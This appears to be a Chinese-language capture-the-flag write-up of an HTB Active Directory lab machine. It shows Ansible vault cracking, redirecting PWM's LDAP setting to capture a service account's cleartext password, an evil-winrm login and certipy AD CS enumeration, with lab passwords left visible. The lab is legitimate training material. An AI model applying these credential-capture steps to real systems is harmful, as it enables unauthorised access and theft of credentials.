class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p>好好好，这么玩是吧，开29个端口是吧，咋不开290个端口。</p>
<p>话是这么说，但是实际上后面RPC调用的端口，都不用看。前面梳理一下，根据经验来说，开了80肯定是要看一下的，139和445的smb共享服务也是要看一下的，还有就是8443有个https-alt的不知道是啥的https服务也是要看一下。其他的暂时不知道有没有用，反正我们先把熟悉的服务一一摸排一遍再说，不行再回看这些服务。</p>
<h3 id="其他扫描"><a href="#其他扫描" class="headerlink" title="其他扫描"></a>其他扫描</h3><p>你问我这次为啥没有nikto？也没目录扫描？因为趁nmap扫的时候提前看了一眼80发现是IIS默认页面，没啥好扫的。</p>
<h2 id="服务渗透"><a href="#服务渗透" class="headerlink" title="服务渗透"></a>服务渗透</h2><h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>既然80是指定不行了，那就该轮到445了，我们先看看smb有没有什么目录是可以无密码访问的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient -L 10.10.11.222<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\me]:<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        Department Shares Disk<br>        Development     Disk<br>        IPC$            IPC       Remote IPC<br>        NETLOGON        Disk      Logon server share<br>        SYSVOL          Disk      Logon server share<br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure>

<p>我们直接用<code>smbclient -L</code>就能列出共享的目录，但是访问权限这些不清楚，所以我们还是要用<code>smbmap</code>扫一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.11.222<br>[+] IP: 10.10.11.222:445        Name: authority.htb<br></code></pre></td></tr></table></figure>

<p>没结果何意啊，明明smbclient都能扫出来，看了一下上面的结果，猜想可能是要提供一个用户名。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.11.222 -u <span class="hljs-string">&quot;test&quot;</span><br>[+] Guest session       IP: 10.10.11.222:445    Name: authority.htb<br>Disk               Permissions     Comment<br>---------------     -------<br>ADMIN$              NO ACCESS       Remote Admin<br>C$                  NO ACCESS       Default share<br>Department Shares   NO ACCESS<br>Development         READ ONLY<br>IPC$                READ ONLY       Remote IPC<br>NETLOGON            NO ACCESS       Logon server share<br>SYSVOL              NO ACCESS       Logon server share<br></code></pre></td></tr></table></figure>

<p>果然如此。我们可以发现，<code>Development</code>和<code>IPC$</code>都可以读，那我们就看看<code>Development</code>吧，因为一般<code>IPC$</code>里都不会有什么内容。我们直接无密码登录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.11.222/Development<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\me]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .               D        0  Fri Mar 17 09:20:38 2023<br>  ..              D        0  Fri Mar 17 09:20:38 2023<br>  Automation      D        0  Fri Mar 17 09:20:40 2023<br><br>5888511 blocks of size 4096. 1215595 blocks available<br>smb: \&gt; <span class="hljs-built_in">cd</span> Automation\<br>smb: \Automation\&gt; <span class="hljs-built_in">ls</span><br>  .               D        0  Fri Mar 17 09:20:40 2023<br>  ..              D        0  Fri Mar 17 09:20:40 2023<br>  Ansible         D        0  Fri Mar 17 09:20:50 2023<br><br>5888511 blocks of size 4096. 1215595 blocks available<br>smb: \Automation\&gt; <span class="hljs-built_in">cd</span> Ansible\<br>smb: \Automation\Ansible\&gt; <span class="hljs-built_in">ls</span><br>  .               D        0  Fri Mar 17 09:20:50 2023<br>  ..              D        0  Fri Mar 17 09:20:50 2023<br>  ADCS            D        0  Fri Mar 17 09:20:48 2023<br>  LDAP            D        0  Fri Mar 17 09:20:48 2023<br>  PWM             D        0  Fri Mar 17 09:20:48 2023<br>  SHARE           D        0  Fri Mar 17 09:20:48 2023<br><br>5888511 blocks of size 4096. 1215595 blocks available<br></code></pre></td></tr></table></figure>

<p>因为不是很熟这些东西的缘故，每个都看了半天，晕晕。</p>
<h3 id="PWM"><a href="#PWM" class="headerlink" title="PWM"></a>PWM</h3><p>不知道这些东西都有啥用。先暂时放着，看看8443的https网页是啥。</p>
<p class='item-img' data-src='/pic/assets/3fa0bacafe98059270478a0aaabba58e.png'><img src="/pic/assets/3fa0bacafe98059270478a0aaabba58e.png" alt="3fa0bacafe98059270478a0aaabba58e"></p>
<p>上来就报了一个提示，说PWM目前处于配置模式，可以不经过LDAP验证就更新配置，然后又给了个登录框。</p>
<p>灵感来了，在PWM之前我们在SMB里面看到过啊，有没有可能里面存有登录凭证啥的？回去翻一翻。</p>
<h4 id="Ansible-vault密文破解"><a href="#Ansible-vault密文破解" class="headerlink" title="Ansible_vault密文破解"></a>Ansible_vault密文破解</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \Automation\Ansible\PWM\defaults\&gt; <span class="hljs-built_in">ls</span><br>  .            D        0  Fri Mar 17 09:20:48 2023<br>  ..           D        0  Fri Mar 17 09:20:48 2023<br>  main.yml     A     1591  Sun Apr 23 18:51:38 2023<br><br>5888511 blocks of size 4096. 1215531 blocks available<br>smb: \Automation\Ansible\PWM\defaults\&gt; get main.yml<br>getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as main.yml (5.0 KiloBytes/sec) (average 3.8 KiloBytes/sec)<br></code></pre></td></tr></table></figure>

<p>我们在<code>\Automation\Ansible\PWM\defaults\</code>目录下发现了一个<code>main.yml</code>文件，看看内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">---<br>pwm_run_dir: <span class="hljs-string">&quot;&#123;&#123; lookup(&#x27;env&#x27;, &#x27;PWD&#x27;) &#125;&#125;&quot;</span><br><br>pwm_hostname: authority.htb.corp<br>pwm_http_port: <span class="hljs-string">&quot;&#123;&#123; http_port &#125;&#125;&quot;</span><br>pwm_https_port: <span class="hljs-string">&quot;&#123;&#123; https_port &#125;&#125;&quot;</span><br>pwm_https_enable: <span class="hljs-literal">true</span><br><br>pwm_require_ssl: <span class="hljs-literal">false</span><br><br>pwm_admin_login: !vault |<br>          <span class="hljs-variable">$ANSIBLE_VAULT</span>;1.1;AES256<br>          32666534386435366537653136663731633138616264323230383566333966346662313161326239<br>          6134353663663462373265633832356663356239383039640a346431373431666433343434366139<br>          35653634376333666234613466396534343030656165396464323564373334616262613439343033<br>          6334326263326364380a653034313733326639323433626130343834663538326439636232306531<br>          3438<br><br>pwm_admin_password: !vault |<br>          <span class="hljs-variable">$ANSIBLE_VAULT</span>;1.1;AES256<br>          31356338343963323063373435363261323563393235633365356134616261666433393263373736<br>          3335616263326464633832376261306131303337653964350a363663623132353136346631396662<br>          38656432323830393339336231373637303535613636646561653637386634613862316638353530<br>          3930356637306461350a316466663037303037653761323565343338653934646533663365363035<br>          6531<br><br>ldap_uri: ldap://127.0.0.1/<br>ldap_base_dn: <span class="hljs-string">&quot;DC=authority,DC=htb&quot;</span><br>ldap_admin_password: !vault |<br>          <span class="hljs-variable">$ANSIBLE_VAULT</span>;1.1;AES256<br>          63303831303534303266356462373731393561313363313038376166336536666232626461653630<br>          3437333035366235613437373733316635313530326639330a643034623530623439616136363563<br>          34646237336164356438383034623462323531316333623135383134656263663266653938333334<br>          3238343230333633350a646664396565633037333431626163306531336336326665316430613566<br>          3764<br></code></pre></td></tr></table></figure>

<p><code>pwm_admin_login</code>,<code>pwm_admin_password</code>,<code>ldap_admin_password</code>这不就是登录凭证嘛。但是这明显是加密后的格式，我们要先解密。先搜一下<code>$ANSIBLE_VAULT</code>是什么加密方式，怎么处理。</p>
<p>我们谷歌一下发现<a target="_blank" rel="noopener" href="https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible">Pentester’s Promiscuous Notebook</a>上有对Ansible的处理方式介绍。</p>
<p class='item-img' data-src='/pic/assets/7062e3666b88cad37e75983cb32735cb.png'><img src="/pic/assets/7062e3666b88cad37e75983cb32735cb.png" alt="7062e3666b88cad37e75983cb32735cb"></p>
<p>我们按着来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> ldap.yml<br><span class="hljs-variable">$ANSIBLE_VAULT</span>;1.1;AES256<br>633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a64303462353062343961613636356334646237361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764<br><br>$ ansible2john ldap.yml<br>ldap.yml:$ansible<span class="hljs-variable">$0</span>*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2e98334284203635<br><br>$ ansible2john ldap.yml &gt; ldap.hash<br><br>$ john ldap.hash --wordlist=/usr/share/wordlists/rockyou.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])<br>Cost 1 (iteration count) is 10000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 2 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>********         (ldap.yml)<br>1g 0:00:00:49 DONE (2023-07-25 03:21) 0.02030g/s 807.7p/s 807.7c/s 807.7C/s 001983..woodson<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>

<p>一通操作下来把vault的密码给破解出来了，那我们接下来就把获取到的三条密文的内容都解密一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ldap.yml | $ ansible-vault decrypt<br>Vault password:<br>Decryption successful<br>DevT3st@123<br><br><span class="hljs-built_in">cat</span> username.yml | $ ansible-vault decrypt <br>Vault password:<br>Decryption successful<br>s******m<br><br>$ ansible-vault decrypt ldap.yml<br>Vault password:<br>Decryption successful<br>p**********3<br></code></pre></td></tr></table></figure>

<h4 id="PWM配置文件利用"><a href="#PWM配置文件利用" class="headerlink" title="PWM配置文件利用"></a>PWM配置文件利用</h4><p>拿到了登录凭证我们就去PWM登录界面登录一下。</p>
<p class='item-img' data-src='/pic/assets/2c1fdc388a0c719d35ab1ffe63226a02.png'><img src="/pic/assets/2c1fdc388a0c719d35ab1ffe63226a02.png" alt="2c1fdc388a0c719d35ab1ffe63226a02"></p>
<p>发现并登不上，那就登录一下Configuration Manager，</p>
<p class='item-img' data-src='/pic/assets/12a9282f2c28995146f5f85b9b55a300.png'><img src="/pic/assets/12a9282f2c28995146f5f85b9b55a300.png" alt="12a9282f2c28995146f5f85b9b55a300"></p>
<p>结合之前打开网页弹出的提示，我们可以不经过LDAP验证而对配置文件进行修改。先把配置文件下载下来，你会发现内容怎么这么多，我们要从哪里下手。这是我们细看一下网页会发现，Health一栏中，<code>LDAP</code>报了一个大大的WARN：</p>
<blockquote>
<p>Unable to connect to LDAP server default, error: error connecting to  ldap directory (default), error: unable to create connection: unable to  connect to any configured ldap url, last error: unable to bind to  ldaps:&#x2F;&#x2F;authority.authority.htb:636 as CN&#x3D;svc_ldap,OU&#x3D;Service  Accounts,OU&#x3D;CORP,DC&#x3D;authority,DC&#x3D;htb reason: CommunicationException  (authority.authority.htb:636; PKIX path building failed:  sun.security.provider.certpath.SunCertPathBuilderException: unable to  find valid certification path to requested target)</p>
</blockquote>
<p>这说明与主机的LDAP服务器没连接上，我们甚至还能发现用户名：<code>CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</code>，那我们在配置文件里面把其LDAP服务的地址改成我们自己的，就能监听到其向LDAP服务器请求验证的账户名和密码了。</p>
<p>直接在配置文件里面搜索<code>ldaps://authority.authority.htb:636</code>，然后改成我们自己的：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;ldap.serverUrls&quot;</span> <span class="hljs-attr">modifyTime</span>=<span class="hljs-string">&quot;2022-08-11T01:46:23Z&quot;</span> <span class="hljs-attr">profile</span>=<span class="hljs-string">&quot;default&quot;</span> <span class="hljs-attr">syntax</span>=<span class="hljs-string">&quot;STRING_ARRAY&quot;</span> <span class="hljs-attr">syntaxVersion</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>ldap://10.10.14.96:389<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里改成389端口的ldap服务而不是636的ldaps的原因是因为LDAP是明文协议，更方便我们获取用户的明文登录凭证。改好之后我们直接import configuration。</p>
<h4 id="ldap监听"><a href="#ldap监听" class="headerlink" title="ldap监听"></a>ldap监听</h4><p>然后本地起一个<code>responder</code>监听一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo responder -I tun0<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0<br><br>  To support this project:<br>  Patreon -&gt; https://www.patreon.com/PythonResponder<br>  Paypal  -&gt; https://paypal.me/PythonResponder<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br><br><br>[+] Poisoners:<br>    LLMNR                      [ON]<br>    NBT-NS                     [ON]<br>    MDNS                       [ON]<br>    DNS                        [ON]<br>    DHCP                       [OFF]<br><br>[+] Servers:<br>    HTTP server                [ON]<br>    HTTPS server               [ON]<br>    WPAD proxy                 [OFF]<br>    Auth proxy                 [OFF]<br>    SMB server                 [ON]<br>    Kerberos server            [ON]<br>    SQL server                 [ON]<br>    FTP server                 [ON]<br>    IMAP server                [ON]<br>    POP3 server                [ON]<br>    SMTP server                [ON]<br>    DNS server                 [ON]<br>    LDAP server                [ON]<br>    RDP server                 [ON]<br>    DCE-RPC server             [ON]<br>    WinRM server               [ON]<br><br>[+] HTTP Options:<br>    Always serving EXE         [OFF]<br>    Serving EXE                [OFF]<br>    Serving HTML               [OFF]<br>    Upstream Proxy             [OFF]<br><br>[+] Poisoning Options:<br>    Analyze Mode               [OFF]<br>    Force WPAD auth            [OFF]<br>    Force Basic Auth           [OFF]<br>    Force LM downgrade         [OFF]<br>    Force ESS downgrade        [OFF]<br><br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [HTB_VPN_IP]<br>    Responder IPv6             [HTB_VPN_IPv6]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don<span class="hljs-string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Current Session Variables:</span><br><span class="hljs-string">    Responder Machine Name     [*************]</span><br><span class="hljs-string">    Responder Domain Name      [********]</span><br><span class="hljs-string">    Responder DCE-RPC Port     [48723]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Listening for events...</span><br><span class="hljs-string"></span><br><span class="hljs-string">[LDAP] Cleartext Client   : 10.10.11.222</span><br><span class="hljs-string">[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</span><br><span class="hljs-string">[LDAP] Cleartext Password : l*****************!</span><br><span class="hljs-string">[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</span><br><span class="hljs-string">[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</span><br></code></pre></td></tr></table></figure>

<p>那么我们就拿到了ldap的明文登录凭证。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>因为我们已经拿到了ldap的登录凭证，此时可以直接用<code>evil-winrm</code>登录，在desktop上可以拿到user flag。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmd">$ evil-winrm -i <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">222</span> -u svc_ldap -p l**************r!<br><br>Evil-WinRM shell v3.<span class="hljs-number">5</span><br><span class="hljs-function"></span><br><span class="hljs-function">Warning: <span class="hljs-title">Remote</span> <span class="hljs-title">path</span> <span class="hljs-title">completions</span> <span class="hljs-title">is</span> <span class="hljs-title">disabled</span> <span class="hljs-title">due</span> <span class="hljs-title">to</span> <span class="hljs-title">ruby</span> <span class="hljs-title">limitation</span>: <span class="hljs-title">quoting_detection_proc</span>() <span class="hljs-title">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Data</span>: <span class="hljs-title">For</span> <span class="hljs-title">more</span> <span class="hljs-title">information</span>, <span class="hljs-title">check</span> <span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span> <span class="hljs-title">GitHub</span>: <span class="hljs-title">https</span>://<span class="hljs-title">github.com</span>/<span class="hljs-title">Hackplayers</span>/<span class="hljs-title">evil</span>-<span class="hljs-title">winrm</span>#<span class="hljs-title">Remote</span>-<span class="hljs-title">path</span>-<span class="hljs-title">completion</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Info</span>: <span class="hljs-title">Establishing</span> <span class="hljs-title">connection</span> <span class="hljs-title">to</span> <span class="hljs-title">remote</span> <span class="hljs-title">endpoint</span></span><br><span class="hljs-function">*<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">svc_ldap</span>\<span class="hljs-title">Documents</span>&gt; <span class="hljs-title">cd</span> ../<span class="hljs-title">Desktop</span></span><br><span class="hljs-function">*<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">svc_ldap</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">dir</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">    <span class="hljs-title">Directory</span>: <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">svc_ldap</span>\<span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Mode</span>                <span class="hljs-title">LastWriteTime</span>         <span class="hljs-title">Length</span> <span class="hljs-title">Name</span></span><br><span class="hljs-function">----                -------------         ------ ----</span><br><span class="hljs-function">-<span class="hljs-title">ar</span>---        7/25/2023   8:18 <span class="hljs-title">AM</span>             34 <span class="hljs-title">user.txt</span></span><br></code></pre></td></tr></table></figure>

<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>Windows这块提取不太熟，先拿<code>certipy</code>扫一下活动目录证书服务（AD CS）中是否有错误配置项可以利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy find -vulnerable -u svc_ldap@authority.htb -p <span class="hljs-string">&#x27;lDaP_1n_th3_cle4r!&#x27;</span> -dc-ip 10.10.11.222<br>Certipy v4.7.0 - by Oliver Lyak (ly4k)<br><br>[*] Finding certificate templates<br>[*] Found 37 certificate templates<br>[*] Finding certificate authorities<br>[*] Found 1 certificate authority<br>[*] Found 13 enabled certificate templates<br>[*] Trying to get CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span> via CSRA<br>[!] Got error <span class="hljs-keyword">while</span> trying to get CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.<br>[*] Trying to get CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span> via RRP<br>[!] Failed to connect to remote registry. Service should be starting now. Trying again...<br>[*] Got CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span><br>[-] Got error: module <span class="hljs-string">&#x27;enum&#x27;</span> has no attribute <span class="hljs-string">&#x27;_decompose&#x27;</span><br>[-] Use -debug to <span class="hljs-built_in">print</span> a stacktrace<br></code></pre></td></tr></table></figure>

<p>报错了，说是<code>enum</code>模块没有<code>_decompose</code>属性，查了一下好像python3.11.4之后的版本好像删掉了这块，懒得用conda虚拟环境创了，我们偷个懒，直接在网上找到_decompose源代码加到enum.py里面（不建议学习，最好先做好备份，用后记得还原）。</p>
<p>这样就能用了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy find -vulnerable -u svc_ldap@authority.htb -p <span class="hljs-string">&#x27;l************r!&#x27;</span> -dc-ip 10.10.11.222<br>Certipy v4.3.0 - by Oliver Lyak (ly4k)<br><br>[*] Finding certificate templates<br>[*] Found 37 certificate templates<br>[*] Finding certificate authorities<br>[*] Found 1 certificate authority<br>[*] Found 13 enabled certificate templates<br>[*] Trying to get CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span> via CSRA<br>[!] Got error <span class="hljs-keyword">while</span> trying to get CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.<br>[*] Trying to get CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span> via RRP<br>[*] Got CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;AUTHORITY-CA&#x27;</span><br>[*] Saved BloodHound data to <span class="hljs-string">&#x27;20230725042904_Certipy.zip&#x27;</span>. Drag and drop the file into the BloodHound GUI from @ly4k<br>[*] Saved text output to <span class="hljs-string">&#x27;20230725042904_Certipy.txt&#x27;</span><br>[*] Saved JSON output to <span class="hljs-string">&#x27;20230725042904_Certipy.json&#x27;</span><br></code></pre></td></tr></table></figure>

<p>扫描结果在<code>20230725042904_Certipy.txt</code>就能看到。</p>
